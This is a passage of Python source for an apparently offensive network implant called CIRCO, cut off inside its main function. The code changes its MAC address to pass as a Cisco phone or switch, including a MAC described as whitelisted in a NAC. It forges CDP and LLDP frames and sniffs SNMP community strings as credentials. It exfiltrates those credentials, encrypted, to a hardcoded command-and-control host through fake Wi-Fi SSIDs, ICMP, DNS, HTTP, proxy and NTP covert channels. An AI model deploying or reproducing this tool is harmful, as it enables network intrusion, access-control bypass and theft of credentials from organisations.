#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function
import subprocess
import os
import signal
import re
import argparse
import sys
import time
import random
import threading
import unicodedata
import datetime
import socket
import telnetlib
import ipcalc
import pyaes
import pyscrypt
import dns.resolver
import requests
from pyfiglet import Figlet
import RPi.GPIO as GPIO
# Remove Scapy IPv6 Warning
sys.stderr = None
from scapy.all import *
# Revert back the STD output
sys.stderr = sys.__stderr__

# Me
__author__ = "Emilio / @ekio_jp"
__version__ = "1.5"

# Default options OFF
DEBUG = False
EAP = False
EPING = False
ETRACE = False
EDNS = False
EWEB = False
ESSL = False
EPRX = False
ENTP = False

# Config
PHRASE = 'Waaaaa! awesome :)'
SALT = 'salgruesa'
WIFICHANNEL = '10'
# this MAC is whitelisted in ForeScout NAC
switchmac = '00:07:B4:00:FA:DE'
switchport = 'FastEthernet0/3'
phonemac = '10:8C:CF:75:BB:AA'
serial = 'FCW1831C1AA'
snpsu = 'LIT18300QBB'
snmpcommunity = 'public'
cchost = '200.200.200.1'
ccname = 'evil.sub.domain'
dirname = '/home/pi-enc/circo/circo/'
# fake-ssid (need to match jaula.py)
SSIDroot = 'aterm-c17c02'
SSIDalarm = 'pacman'
# BSSID MAC from NEC ATERM routers
wifimac = '98:f1:99:c1:7c:02'

# Perm files
snmptpl = dirname + 'Cisco_2960-tpl.snmpwalk'

# Temp files
snmpfake = dirname + 'Cisco_2960-fake.snmpwalk'
clifd = dirname + 'cli.conf'
agent = dirname + 'agent.csv'
mastercred = dirname + time.strftime(
             "%Y%m%d%H%M%S_CRED.txt", time.gmtime())


# Classes
class AlarmHandler(threading.Thread):
    """
    Class to handle case alarm
    magnet will make contact when closing case, if open ring alarm and shutdown
    Using GPIO 10 (real pin number)
    """
    def __init__(self, swmac, gwmac, ip, iface, wiface, dns, prx):
        threading.Thread.__init__(self)
        self.stoprequest = threading.Event()
        self.switchmac = swmac
        self.gwmac = gwmac
        self.ip = ip
        self.iface = iface
        self.wiface = wiface
        self.dns_srv = dns
        self.prxlist = prx
        GPIO.setmode(GPIO.BOARD)
        GPIO.setup(10, GPIO.IN, pull_up_down=GPIO.PUD_DOWN)

    def bang(self):

        # Wifi SC 666
        if EAP:
            wifipkt = RadioTap(present='Channel', Channel=10, version=0, pad=0, len=12)/Dot11()/Dot11Beacon()/Dot11Elt()/Dot11EltRSN()
            wifipkt[Dot11].addr2 = wifimac
            wifipkt[Dot11].addr3 = wifimac
            wifipkt[Dot11Elt].info = SSIDalarm
            wifipkt[Dot11Elt].len = len(SSIDalarm)
            wifipkt[Dot11].SC = 666
            sendp(wifipkt, iface=self.wiface, inter=0.500, count=5, verbose=0)

        # ICMP (IP.id 666)
        if EPING:
            pingpkt = (Ether(src=self.switchmac, dst=self.gwmac) /
                       IP(ihl=5, src=self.ip, dst=cchost, id=666) /
                       ICMP(id=random.randint(0, 0xFFFF),seq=1) /
                       Raw(load='\x00\x00\x00\x00\x18\x83'
                                '\xedt\xab\xcd\xab\xcd\xab'
                                '\xcd\xab\xcd\xab\xcd\xab'
                                '\xcd\xab\xcd\xab\xcd\xab'
                                '\xcd\xab\xcd\xab\xcd\xab'
                                '\xcd\xab\xcd\xab\xcd\xab'
                                '\xcd\xab\xcd\xab\xcd\xab'
                                '\xcd\xab\xcd\xab\xcd\xab'
                                '\xcd\xab\xcd\xab\xcd\xab'
                                '\xcd\xab\xcd\xab\xcd\xab'
                                '\xcd\xab\xcd\xab\xcd\xab'
                                '\xcd\xab\xcd\xab\xcd'))
            pingpkt = pingpkt.__class__(str(pingpkt))
            sendp(pingpkt, iface=self.iface, verbose=0)

        # Trace (IP.id 666)
        if ETRACE:
            trcpkt = (Ether(src=self.switchmac, dst=self.gwmac) /
                      IP(ihl=5, src=self.ip, dst=cchost, ttl=32, id=666) /
                      UDP(sport=53200, dport=33434))
            trcpkt = trcpkt.__class__(str(trcpkt))
            sendp(trcpkt, iface=self.iface, verbose=0)

        # DNS (NS 666.<domain>)
        if EDNS:
            dnspkt = (Ether(src=self.switchmac, dst=self.gwmac) /
                      IP(ihl=5, src=self.ip, dst=self.dns_srv) /
                      UDP(sport=53, dport=53) /
                      DNS(rd=1,
                          qd=DNSQR(
                                   qname='666.'+ccname,
                                   qtype='NS')))
            dnspkt[IP].id = random.randint(0, 0xFFFF)
            dnspkt[DNS].id = random.randint(0, 0xFFFF)
            dnspkt = dnspkt.__class__(str(dnspkt))
            sendp(dnspkt, iface=self.iface, verbose=0)

        # HTTP/HTTPS (IP.id 666)
        if EWEB or ESSL:
            httppkt = (Ether(src=self.switchmac, dst=self.gwmac) /
                       IP(ihl=5,
                          flags='DF',
                          src=self.ip,
                          dst=cchost,
                          id=666) /
                       TCP(sport=random.randint(3025, 38000),
                           ack=0,
                           dataofs=10,
                           reserved=0,
                           flags='S',
                           urgptr=0))
            httppkt[TCP].options = [('MSS', 1460),
                                    ('SAckOK', ''),
                                    ('Timestamp',
                                     (int(time.time()), 0)),
                                    ('NOP', None),
                                    ('WScale', 6)]
            httppkt[TCP].seq = random.randint(1000000000,
                                              1800000000)
            httppkt[TCP].window = random.randint(30000, 40000)
            if EWEB:
                httppkt[TCP].dport = 80
                httppkt = httppkt.__class__(str(httppkt))
                sendp(httppkt, iface=self.iface, verbose=0)
            if ESSL:
                httppkt[TCP].dport = 443
                httppkt = httppkt.__class__(str(httppkt))
                sendp(httppkt, iface=self.iface, verbose=0)

        # Proxy (NS 666.<domain>)
        if EPRX and self.prxlist:
            headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv11.0) like Gecko',
                    'Accept-Enconding': ', '.join(('gzip', 'deflate')),
                    'Accept': '*/*',
                    'Connection': 'keep-alive'
            }
            fakeurl = 'http://666.' + ccname
            for prx in range(len(self.prxlist)):
                http_proxy = 'http://' + self.prxlist[prx]
                proxydict = {
                            'http': http_proxy,
                            'https': http_proxy
                            }
                try:
                    r = requests.get(fakeurl, headers=headers, proxies=proxydict)
                except requests.exceptions.RequestException:
                    pass

        # NTP (Stratum 99)
        if ENTP:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
            s.bind((self.ip, 123))
            s.connect((cchost, 123))
            timenow = datetime.utcnow() - datetime(1900, 1, 1, 0, 0, 0)
            ntptime = format(int(timenow.total_seconds()), 'x').decode('hex')
            ntppkt = '\xe3\x63\x14\x14\0\x01\0\0\0\x01' + 30 * '\0' + ntptime + 4 * '\0'
            s.send(ntppkt)

    def run(self):
        while not self.stoprequest.isSet():
            button_state = GPIO.input(10)
            if button_state is True:
                # True => button pressed
                # False => button not pressed
                time.sleep(1)
            else:
                # Alarm! case open
                if DEBUG:
                    print('Awwwwww Case Open!!!! GAME OVER')
                self.bang()
                if DEBUG:
                    #subprocess.call('echo o >/proc/sysrq-trigger', shell=True)
                    print('Sayonara')
                    os._exit(1)

    def join(self):
        GPIO.cleanup()
        self.stoprequest.set()


class APHandler(threading.Thread):
    """
    Class to handle the Fake AP broadcasting SSID for extraction
    probe interval is 0.5 seconds per BSSID, adjust timer and inter if need it
    """
    def __init__(self, wiface, fd, timer):
        threading.Thread.__init__(self)
        self.stoprequest = threading.Event()
        self.wiface = wiface
        self.fd = fd
        self.count = timer

    def run(self):
        while not self.stoprequest.isSet():
            if os.path.isfile(self.fd):
                with open(self.fd, 'r') as sfile:
                    for line in sfile:
                        wifipkt = RadioTap(present='Channel', Channel=10, version=0, pad=0, len=12)/Dot11()/Dot11Beacon()/Dot11Elt()/Dot11EltRSN()
                        wifipkt[Dot11].addr2 = wifimac
                        wifipkt[Dot11].addr3 = wifimac
                        wifipkt[Dot11Elt].info = SSIDroot
                        wifipkt[Dot11Elt].len = len(SSIDroot)
                        if DEBUG:
                            print('Sending credentials via Fake-AP')
                        cry = encrypt(line.strip())
                        # split crypto len by 6
                        ar = [cry[i:i+6] for i in range(0, len(cry), 6)]
                        # padding
                        if len(ar) % 6 != 0:
                            for x in range(6-len(ar[len(ar)-1])):
                                ar[len(ar)-1] = ar[len(ar)-1] + '0'
                        # send first SSID (with out -g)
                        wifipkt[Dot11].SC = len(ar)
                        wifipkt[Dot11Beacon].beacon_interval = len(cry)
                        # send the rest of SSID (with -g)
                        sendp(wifipkt, iface=self.wiface, inter=0.100,
                              count=self.count, verbose=0)
                        #time.sleep(2)
                        for x in range(len(ar)):
                            nadd2 = (wifimac[0:9] + ar[x][0:2] + ':' +
                                     ar[x][2:4] + ':' + ar[x][4:6])
                            wifipkt[Dot11].SC = x
                            wifipkt[Dot11].addr2 = nadd2
                            wifipkt[Dot11].addr3 = nadd2
                            wifipkt[Dot11Elt].info = SSIDroot[:-6:] + ar[x] + '-g'
                            wifipkt[Dot11Elt].len = len(wifipkt[Dot11Elt].info)
                            sendp(wifipkt, iface=self.wiface, inter=0.100,
                                  count=self.count, verbose=0)
                        time.sleep(2)
                time.sleep(10)

    def join(self):
        self.stoprequest.set()


class CDPHandler(threading.Thread):
    """
    Class to handle CDP packets, will start in background and send
    packets every 60 seconds, pretend to be a Cisco Phone or Switch
    """
    def __init__(self, iface, mac, ip, name, port, switch):
        threading.Thread.__init__(self)
        self.stoprequest = threading.Event()
        self.iface = iface
        self.mac = mac
        self.ip = ip
        self.name = name
        self.port = port
        self.switch = switch

    def run(self):
        # Build Fake CDP packet
        fakepkt = Dot3()/LLC()/SNAP()/CDPv2_HDR()
        fakepkt[Dot3].dst = '01:00:0c:cc:cc:cc'
        fakepkt[Dot3].src = self.mac
        fakepkt[CDPv2_HDR].msg = CDPMsgDeviceID()
        fakepkt[CDPMsgDeviceID].val = self.name
        fakepkt[CDPMsgDeviceID].len = len(fakepkt[CDPMsgDeviceID])
        fakepkt = fakepkt/CDPMsgSoftwareVersion()
	if self.switch:
            fakepkt[CDPMsgSoftwareVersion].val = 'Cisco IOS Software, C2960 Software (C2960-LANBASEK9-M), Version 15.0(2)SE, RELEASE SOFTWARE (fc1)\nTechnical Support: http://www.cisco.com/techsupport\nCopyright (c) 1986-2012 by Cisco Systems, Inc.\nCompiled Sat 28-Jul-12 00:29 by prod_rel_team'
	else:
            fakepkt[CDPMsgSoftwareVersion].val = 'SIP75.8-5-3SR1S'

        fakepkt[CDPMsgSoftwareVersion].len = len(fakepkt[CDPMsgSoftwareVersion])
        fakepkt = fakepkt/CDPMsgPlatform()
        if self.switch:
            fakepkt[CDPMsgPlatform].val = 'cisco WS-C2960-8TC-L'
        else:
            fakepkt[CDPMsgPlatform].val = 'Cisco IP Phone 7975'
        fakepkt[CDPMsgPlatform].len = len(fakepkt[CDPMsgPlatform])
        fakepkt = fakepkt/CDPMsgAddr()
        fakepkt[CDPMsgAddr].naddr = 1
        fakepkt[CDPMsgAddr].addr = CDPAddrRecordIPv4()
        fakepkt[CDPMsgAddr][CDPAddrRecordIPv4].addr = self.ip
        fakepkt = fakepkt/CDPMsgPortID()
        fakepkt[CDPMsgPortID].iface = self.port
        fakepkt[CDPMsgPortID].len = len(fakepkt[CDPMsgPortID])
        if self.switch:
            fakepkt = fakepkt/CDPMsgCapabilities(cap=40)
            fakepkt = fakepkt/CDPMsgProtoHello()
            fakepkt[CDPMsgProtoHello].protocol_id = 0x112
            fakepkt[CDPMsgProtoHello].data = '\x00\x00\x00\x00\xff\xff\xff\xff\x01\x02!\xff\x00\x00\x00\x00\x00\x00X\x97\x1e\x1c/\x00\xff\x00\x00'
            fakepkt[CDPMsgProtoHello].len = len(fakepkt[CDPMsgProtoHello])
            fakepkt = fakepkt/CDPMsgVTPMgmtDomain()
            fakepkt[CDPMsgVTPMgmtDomain].len = len(fakepkt[CDPMsgVTPMgmtDomain])
            fakepkt = fakepkt/CDPMsgNativeVLAN()
            fakepkt[CDPMsgNativeVLAN].vlan = 100
            fakepkt[CDPMsgNativeVLAN].len = len(fakepkt[CDPMsgNativeVLAN])
            fakepkt = fakepkt/CDPMsgDuplex(duplex=1)
            fakepkt = fakepkt/CDPMsgTrustBitmap()
            fakepkt = fakepkt/CDPMsgUntrustedPortCoS()
            fakepkt = fakepkt/CDPMsgMgmtAddr()
            fakepkt[CDPMsgMgmtAddr].naddr = 1
            fakepkt[CDPMsgMgmtAddr].addr = CDPAddrRecordIPv4()
            fakepkt[CDPMsgMgmtAddr][CDPAddrRecordIPv4].addr = self.ip
            fakepkt = fakepkt/CDPMsgGeneric()
            fakepkt[CDPMsgGeneric].type = 26
            fakepkt[CDPMsgGeneric].val = '\x00\x00\x00\x01\x00\x00\x00\x00\xff\xff\xff\xff'
            fakepkt[CDPMsgGeneric].len = len(fakepkt[CDPMsgGeneric])
            fakepkt = fakepkt/CDPMsgGeneric(type=31, len=5, val='\x00')
            fakepkt = fakepkt/CDPMsgGeneric(type=4099, len=5, val='1')
        else:
            fakepkt = fakepkt/CDPMsgCapabilities(cap=1168)
            fakepkt = fakepkt/CDPMsgGeneric()
            fakepkt[CDPMsgGeneric].type = 28
            fakepkt[CDPMsgGeneric].val = '\x00\x02\x00'
            fakepkt[CDPMsgGeneric].len = len(fakepkt[CDPMsgGeneric])
            fakepkt = fakepkt/CDPMsgUnknown19()
            fakepkt[CDPMsgUnknown19].type = 25
            fakepkt[CDPMsgUnknown19].val = 'y\x85\x00\x00\x00\x00.\xe0'
            fakepkt[CDPMsgUnknown19].len = len(fakepkt[CDPMsgUnknown19])
            fakepkt = fakepkt/CDPMsgDuplex(duplex=1)
            fakepkt = fakepkt/CDPMsgPower(type=16,power=12000)

        # re-calculate len & cksum
        del fakepkt.cksum
        del fakepkt.len
        fakepkt.len = len(fakepkt[CDPv2_HDR]) + 8
        fakepkt = fakepkt.__class__(str(fakepkt))

        while not self.stoprequest.isSet():
            sendp(fakepkt, verbose=0, iface=self.iface)
            time.sleep(60)

    def join(self):
        self.stoprequest.set()


class LLDPHandler(threading.Thread):
    """
    Class to handle LLDP packets, will start in background and send
    packets every 30 seconds, pretend to be a Cisco Phone or Switch
    """
    def __init__(self, iface, mac, ip, name, port, switch):
        threading.Thread.__init__(self)
        self.stoprequest = threading.Event()
        self.iface = iface
        self.mac = mac
        self.ip = ip
        self.name = name
        self.port = port
        self.switch = switch

    def run(self):
        pkteth = Ether(dst='01:80:c2:00:00:0e', src=self.mac, type=35020)
        pktchass = LLDPDUChassisID(_type=1, subtype=4, _length=7, id=self.mac)
        pktportid = LLDPDUPortID(_type=2, subtype=5)
        pktportid.id = self.port[:2] + re.findall(r'[0-9/]+', self.port)[0]
        pktportid._length = len(pktportid[LLDPDUPortID].id) + 1
        pktttl = LLDPDUTimeToLive(_type=3, ttl=120, _length=2)
        pktsys = LLDPDUSystemName(_type=5, system_name=self.name)
        pktsys._length = len(pktsys[LLDPDUSystemName].system_name)
        pktdes = LLDPDUSystemDescription(_type=6)
        if self.switch:
            pktdes.description = 'Cisco IOS Software, C2960 Software (C2960-LANBASEK9-M), Version 15.0(2)SE, RELEASE SOFTWARE (fc1)\nTechnical Support: http://www.cisco.com/techsupport\nCopyright (c) 1986-2012 by Cisco Systems, Inc.\nCompiled Sat 28-Jul-12 00:29 by prod_rel_team'
        else:
            pktdes.description = 'SIP75.8-5-3SR1S'
        pktdes._length = len(pktdes[LLDPDUSystemDescription].description)
        pktport = LLDPDUPortDescription(_type=4, description=self.port)
        pktport._length = len(pktport[LLDPDUPortDescription].description)
        pktsyscap = LLDPDUSystemCapabilities(_type=7, _length=4, mac_bridge_available=1, mac_bridge_enabled=1)
        pktmgt = LLDPDUManagementAddress(_type=8, _length=12)
        pktmgt.management_address = (chr(int(self.ip.split('.')[0]))
                                     + chr(int(self.ip.split('.')[1]))
                                     + chr(int(self.ip.split('.')[2]))
                                     + chr(int(self.ip.split('.')[3])))
        pktmgt._management_address_string_length = 5
        pktmgt.management_address_subtype = 1
        pktmgt.interface_numbering_subtype = 3
        pktmgt.interface_number = long(100)
        pktmgt._oid_string_length = 0
        pktmgt.object_id = ''
        pkt8021 = LLDPDUGenericOrganisationSpecific(_type=127, _length=6, org_code=32962, subtype=1, data='\x00d')
        pkt8023 = LLDPDUGenericOrganisationSpecific(_type=127, _length=9, org_code=4623, subtype=1, data='\x03l\x03\x00\x10')
        pktend = LLDPDUEndOfLLDPDU(_type=0, _length=0)
        pkt = pkteth / pktchass / pktportid / pktttl / pktsys / pktdes \
            / pktport / pktsyscap / pktmgt / pkt8021 / pkt8023 / pktend

        while not self.stoprequest.isSet():
            sendp(pkt, iface=self.iface, verbose=0)
            time.sleep(30)

    def join(self):
        self.stoprequest.set()


class SNMPHandler(threading.Thread):
    """
    Sniff for packets on UDP/161 and extract community into a file
    default community 'public' is not added as credentials
    """
    def __init__(self, iface, fd):
        threading.Thread.__init__(self)
        self.stoprequest = threading.Event()
        self.iface = iface
        self.fd = fd
        self.community = snmpcommunity

    def nonascii(self, s):
        return "".join(ch for ch in s if unicodedata.category(ch)[0] != "C")

    def pkt_callback(self, pkt):
        if pkt.haslayer(SNMP) and pkt[SNMP].community:
            comm = str(self.nonascii(str(pkt[SNMP].community).decode('utf_8')))
            if (comm != self.community) and not grep(self.fd, comm):
                srcip = strtohex(pkt[IP].src)
                with open(self.fd, 'a+') as sfile:
                    sfile.write('p,' + comm + ',' + srcip + '\n')
                    if DEBUG:
                        print('Found SNMP credentials')

    def run(self):
        while not self.stoprequest.isSet():
            sniff(iface=self.iface, prn=self.pkt_callback,
                  filter="udp port 161", store=0, count=1)

    def join(self):
        self.stoprequest.set()


class DHCPHandler(threading.Thread):
    """
    Class for DHCP responses, parse it and return the details
    """
    def __init__(self, iface):
        threading.Thread.__init__(self)
        self.stoprequest = threading.Event()
        self.iface = iface
        self.offer = 1
        self._rtn_ip = None
        self._rtn_mask = None
        self._rtn_gwip = None
        self._rtn_dns_srv = None
        self._rtn_domain = None
        self._rtn_pac = None

    def pkt_callbak(self, pkt):
        if DHCP in pkt:
            mtype = pkt[DHCP].options[0][1]
            ipaddr = pkt[BOOTP].yiaddr
            sip = pkt[BOOTP].siaddr
            mac = get_if_hwaddr(self.iface)
            if (mtype == 2) and (self.offer <= 1) and (pkt[Ether].dst == mac):
                self.offer = self.offer + 1
                for opt in pkt[DHCP].options:
                    if 'router' in opt:
                        gwip = opt[1]
                    if 'subnet_mask' in opt:
                        netmask = opt[1]
                    if 'domain' in opt:
                        domain = opt[1]
                    if (('name_server' in opt) or
                       ('domain-name-servers' in opt)):
                        dns_srv = opt[1]
                    if opt[0] == 252:
                        pac = opt[1]
                self._rtn_ip = ipaddr
                self._rtn_mask = netmask
                self._rtn_gwip = gwip
                self._rtn_dns_srv = dns_srv
                self._rtn_domain = domain
                self._rtn_pac = pac
                request = (Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
                           IP(src="0.0.0.0", dst="255.255.255.255") /
                           UDP(sport=68, dport=67) /
                           BOOTP(chaddr=pkt[BOOTP].chaddr,
                                 xid=pkt[BOOTP].xid) /
                           DHCP(options=[('message-type', 'request'),
                                         ('server_id', sip),
                                         ('requested_addr', ipaddr),
                                         ('param_req_list', 0),
                                         ('end')
                                         ])
                           )
                sendp(request, iface=self.iface, verbose=0)
                self.join()

    def run(self):
        while not self.stoprequest.isSet():
            sniff(iface=self.iface, prn=self.pkt_callbak,
                  filter="udp and (port 68 or port 67)", store=0)

    def join(self):
        self.stoprequest.set()
        return self._rtn_ip, self._rtn_mask, self._rtn_gwip, self._rtn_dns_srv, self._rtn_domain, self._rtn_pac


class DHCPInformHandler(threading.Thread):
    """
    Class for DHCP Inform request to ask for Option 252
    """

    def __init__(self, iface, xid):
        threading.Thread.__init__(self)
        self.stoprequest = threading.Event()
        self.iface = iface
        self._return = None
        self.xid = xid
        self.ack = 1

    def pkt_callback(self, pkt):
        if DHCP in pkt:
            mtype = pkt[DHCP].options[0][1]
            xid = pkt[BOOTP].xid
            if (mtype == 5) and (self.ack <= 1) and (xid == self.xid):
                self.ack = self.ack + 1
                for opt in pkt[DHCP].options:
                    if opt[0] == 252:
                        wpad = opt[1]
                        break
                self._return = wpad
                self.join()


    def run(self):
        while not self.stoprequest.isSet():
            sniff(iface=self.iface, prn=self.pkt_callback,
                  filter='udp and (port 68 or port 67)', store=0)

    def join(self):
        self.stoprequest.set()
        return self._return


# Functions
def grep(fd, pattern):
    if os.path.isfile(fd):
        with open(fd, "r") as sfile:
            lines = sfile.read().split()
            for x in range(len(lines)):
                if pattern in lines[x]:
                    return True
        return False
    else:
        return False

def grepline(fd, pattern):
    if os.path.isfile(fd):
        with open(fd, "r") as sfile:
            lines = sfile.readlines()
            for line in lines:
                if pattern in line:
                    return line

# IP Dotted format to hex for exfiltration
def strtohex(ip):
    return ''.join('{:02x}'.format(int(char)) for char in ip.split('.'))

# Hex to IP Dotted format
def hextoip(ip):
    n = 2
    return '.'.join([str(int(ip[i:i+n], 16)) for i in range(0, len(ip), n)])

# Look around for CDP/LLDP searching for device names
def discover(iface):
    cli = open(clifd, 'w')
    cdpname = sniff(iface=iface,
                    filter='ether[20:2] == 0x2000', count=1, timeout=61)
    lldpname = sniff(iface=iface,
                     filter='ether proto 0x88cc', count=1, timeout=31)
    if cdpname:
        cli.write('<CDPNAME>,'
                  + cdpname[0][CDPv2_HDR][CDPMsgDeviceID].val.split('.')[0] + '\n')
        cli.write('<CDPINT>,'
                  + cdpname[0][CDPv2_HDR][CDPMsgPortID].iface + '\n')
        cli.write('<CDPIP>,'
                  + cdpname[0][CDPv2_HDR][CDPAddrRecordIPv4].addr + '\n')
        cli.write('<CDPMODEL>,'
                  + str(cdpname[0][CDPv2_HDR][CDPMsgPlatform].val).split()[1]
                  + '\n')
    if lldpname:
        cli.write('<LLDPNAME>,'
                  + lldpname[0][LLDPDU][LLDPDUSystemName].system_name.split('.')[0] + '\n')
        cli.write('<LLDPINT>,'
                  + lldpname[0][LLDPDU][LLDPDUPortDescription].description
                  + '\n')
        cli.write('<LLDPIP>,'
                  + hextoip(lldpname[0][LLDPDU][LLDPDUManagementAddress].management_address.encode('hex')) + '\n')
    cli.close()

# Take interface down before MAC changing 
def changemac(iface, newmac):
    subprocess.call('ifconfig ' + iface + ' down >/dev/null', shell=True)
    subprocess.call('macchanger --mac=' + newmac + ' '
                    + iface + ' >/dev/null', shell=True)
    subprocess.call('ifconfig ' + iface + ' up >/dev/null', shell=True)


# Replace add route, resolve and setup IP (from DHCP)
def setip(iface, ip, mask, gw, dns_srv):
    FNULL = open(os.devnull, 'w')
    RESOLVE = open('/etc/resolv.conf', 'w')
    subprocess.call(["ifconfig", iface, ip, "netmask", mask],
                    stdout=FNULL, stderr=subprocess.STDOUT)
    subprocess.call(["route", "add", "default", "gw", gw],
                    stdout=FNULL, stderr=subprocess.STDOUT)
    subprocess.call(["echo", "nameserver", dns_srv],
                    stdout=RESOLVE, stderr=FNULL)
    RESOLVE.close()


# Generate fake switch name
def newname(cname):
    cname = cname.split('.')[0]
    laststr = cname[-1:]
    if laststr.isdigit():
        total = int(laststr) + 2
        newswname = cname[:len(cname)-1] + str(total)
    else:
        newswname = cname + '01'
    return newswname


def kill_process(pstring):
    for line in os.popen("ps ax | grep " + pstring + " | grep -v grep"):
        fields = line.split()
        pid = fields[0]
        os.kill(int(pid), signal.SIGKILL)


# Build SNMP OID Fake config
def snmpconf(swname, swip, swmask, swnet, swmac, gw, gwmac):
    gwmachex = gwmac.split(':')[0].upper() + ' '\
                + gwmac.split(':')[1].upper() + ' '\
                + gwmac.split(':')[2].upper() + ' '\
                + gwmac.split(':')[3].upper() + ' '\
                + gwmac.split(':')[4].upper() + ' '\
                + gwmac.split(':')[5].upper()
    hexip = "%0.2X" % int(swip.split('.')[0])\
            + " %0.2X" % int(swip.split('.')[1])\
            + " %0.2X" % int(swip.split('.')[2])\
            + " %0.2X" % int(swip.split('.')[3])\
            + ' 00 A1'
    machex = swmac.split(':')[0].upper() + ' '\
                + swmac.split(':')[1].upper() + ' '\
                + swmac.split(':')[2].upper() + ' '\
                + swmac.split(':')[3].upper() + ' '\
                + swmac.split(':')[4].upper() + ' '\
                + swmac.split(':')[5].upper()
    snmphex = []
    for i in range(len(snmpcommunity)):
        snmphex.append("%0.2X" % int(ord(snmpcommunity[i])))
    snmphex = ' '.join(snmphex)
    with open(snmptpl, 'r') as sfile:
        content = sfile.read()
        for repl in (('<NAME>', swname),
                     ('<IP>', swip),
                     ('<MASK>', swmask),
                     ('<NET>', swnet),
                     ('<MACHEX>', machex),
                     ('<GATEWAY>', gw),
                     ('<GWMAC>', gwmachex),
                     ('<SERIAL>', serial),
                     ('<SNPSU>', snpsu),
                     ('<SNMPHEX>', snmphex),
                     ('<IPHEX>', hexip)):
            content = content.replace(*repl)
    with open(snmpfake, 'w') as sfile:
        sfile.write(content)
    with open(agent, 'w') as sfile:
        sfile.write(snmpfake + ',' + swip + ',' + snmpcommunity + '\n')


# Connect to a potencial PAC URL and look for 'PROXY' lines, return a list
def getpac(ip, url):
    headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv11.0) like Gecko',
            'Accept-Enconding': ', '.join(('gzip', 'deflate')),
            'Accept': '*/*',
            'Connection': 'keep-alive'
    }
    mm = set()
    if not url:
        pacurl = 'http://' + ip + '/'
    elif url == 'PAD':
        pacurl = 'http://' + ip + '/wpad.dat'
    else:
        pacurl = ip
    try:
        session = requests.get(pacurl, headers=headers)
        if session.status_code == 200:
            for x in range(len(session.content.split('\n'))):
                a = re.findall('PROXY ([0-9a-zA-Z.:-]+)', session.content.split('\n')[x])
                for m in range(len(a)):
                    if not re.search('127.0.0.1|localhost', a[m]):
                        mm.add(a[m])
        li = list(mm)
        li.sort()
        if li:
            return li
        else:
            return None
    except requests.exceptions.RequestException:
        return None

# Telnet Banner Grabber
def telnetgrab(listip):
    buf = ''
    for ip in listip:
        try:
            tn = telnetlib.Telnet(ip, 23, 3)
        except:
            continue
        try:
            buf = tn.read_until("sername: ", 3)
            break
        except:
            try:
                buf = tn.read_until("assword: ", 3)
                break
            except:
                try:
                    buf = tn.read_until("ogin: ", 3)
                    break
                except:
                    pass
    if buf:
        return buf
    else:
        return None


# AES crypto
def encrypt(cleartxt):
    hashed = pyscrypt.hash(PHRASE, SALT, 1024, 1, 1, 16)
    key = hashed.encode('hex')
    aes = pyaes.AESModeOfOperationCTR(key)
    ciphertxt = aes.encrypt(cleartxt)
    return ciphertxt.encode('hex')


def parsingopt():
    f = Figlet(font='standard')
    print(f.renderText('CIRCO'))
    print('Author: ' + __author__)
    print('Version: ' + __version__ + '\n')
    parser = argparse.ArgumentParser(add_help=True)
    command_group_mode = parser.add_mutually_exclusive_group(required=True)
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Enable debugging')
    command_group_mode.add_argument('-i', dest='nic', metavar='<eth0>',
                        help='Single Mode: <eth0>')
    command_group_mode.add_argument('-b', '--bridge', action='store_true',
                        help='Bridge Mode: Use eth0 & eth1')
    parser.add_argument('-A', '--ALL', action='store_true',
                        help='All exfiltration except wifi')
    parser.add_argument('-p', '--ping', action='store_true',
                        help='PING exfiltration')
    parser.add_argument('-t', '--trace', action='store_true',
                        help='Traceroute exfiltration')
    parser.add_argument('-d', '--dns', action='store_true',
                        help='DNS exfiltration')
    parser.add_argument('-w', '--web', action='store_true',
                        help='HTTP exfiltration')
    parser.add_argument('-s', '--ssl', action='store_true',
                        help='HTTPS exfiltration')
    parser.add_argument('-x', '--prx', action='store_true',
                        help='Proxy exfiltration')
    parser.add_argument('-n', '--ntp', action='store_true',
                        help='NTP exfiltration')
    parser.add_argument('-a', dest='wnic', metavar='<wlan1>',
                        help='Wireles exfiltration')
    if len(sys.argv) > 1:
        try:
            return parser.parse_args()
        except IOError, msg:
            parser.error(str(msg))
    else:
        parser.print_help()
        sys.exit(1)


# Main Function

def main():
    global DEBUG
    global EAP
    global EPING
    global ETRACE
    global EDNS
    global EWEB
    global ESSL
    global EPRX
    global ENTP
    options = parsingopt()
    if options.verbose:
        DEBUG = True
    if options.nic:
        iface = options.nic
    elif options.bridge:
        iface = 'br0'
    if options.ALL:
        EPING = True
        ETRACE = True
        EDNS = True
        EWEB = True
        ESSL = True
        EPRX = True
        ENTP = True
    if options.wnic:
        wiface = options.wnic
        EAP = True
    if options.ping:
        EPING = True
    if options.trace:
        ETRACE = True
    if options.dns:
        EDNS = True
    if options.web:
        EWEB = True
    if options.ssl:
        ESSL = True
    if options.prx:
        EPRX = True
    if options.ntp:
        ENTP = True

    # Load Scapy modules
    load_contrib("cdp")
    load_contrib("lldp")

    # Bring LAN interface up
    if options.nic:
        # Change MAC, became a Cisco IP-Phone!
        if DEBUG:
            print('MAC change started - phone')
        changemac(iface, phonemac)
        if DEBUG:
            print('MAC change ended - phone')
    if options.bridge:
        # Bring Bridge interface up
        subprocess.call('/sbin/brctl addbr br0', shell=True)
        subprocess.call('/sbin/brctl addif br0 eth0', shell=True)
        subprocess.call('/sbin/brctl addif br0 eth1', shell=True)
        subprocess.call('/sbin/brctl setfd br0 0', shell=True)
        subprocess.call('/sbin/ifconfig br0 up', shell=True)
        subprocess.call('/sbin/ifconfig eth0 up', shell=True)
        subprocess.call('/sbin/ifconfig eth1 up', shell=True)
        # Change MAC, became a Cisco Switch!
        if DEBUG:
            print('MAC change started - switch')
        changemac(iface, switchmac)
        if DEBUG:
            print('MAC change ended - switch')

    # Listen for CDP packets to get hostname from it
    if DEBUG:
        print('CDP/LLDP discover started')
    if options.bridge:
        discover('eth0')
    else:
        discover(iface)
    if DEBUG:
        print('CDP/LLDP discover ended')

    # Grab an IP using DHCP
    if DEBUG:
        print('DHCP started')
    dh = DHCPHandler(iface)
    dh.daemon = True
    dh.start()
    time.sleep(0.5)
    mac = get_if_hwaddr(iface)
    chaddr = ''.join([chr(int(x, 16)) for x in mac.split(':')])
